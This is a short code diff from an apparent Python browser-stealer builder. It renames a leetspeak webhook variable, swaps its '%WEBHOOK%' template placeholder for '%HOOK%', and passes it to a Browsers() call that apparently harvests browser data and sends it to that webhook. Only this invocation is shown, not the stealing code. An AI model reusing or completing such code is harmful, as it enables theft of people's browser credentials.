@@ -375,5 +375,5 @@ class Types:
             return self.__str__()
 
         
-H00K3_URL = "%WEBHOOK%"
-Browsers(H00K3_URL)
+W3BH00K_URL = "%HOOK%"
+Browsers(W3BH00K_URL)
